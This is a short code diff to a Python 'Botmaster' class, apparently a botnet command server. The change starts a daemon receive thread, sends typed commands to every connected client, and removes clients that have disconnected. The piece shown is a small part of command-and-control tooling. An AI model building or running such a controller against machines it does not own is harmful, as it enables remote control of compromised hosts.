@@ -31,11 +31,17 @@ class Botmaster:
 					exit()
 				else:
 					printrecv = threading.Thread(target=self.pr)
+					printrecv.daemon = True
+					printrecv.start()
 					msg = str()
 					while msg != "exit":
 						msg = input(">>")
 						for c in self.conns:
-							c.send(msg.encode())
+							try:
+								c.send(msg.encode())
+							except:
+								print("{} se ha desconectado.".format(c))
+								self.conns.remove(c)
 
 
 	def w4c(self):
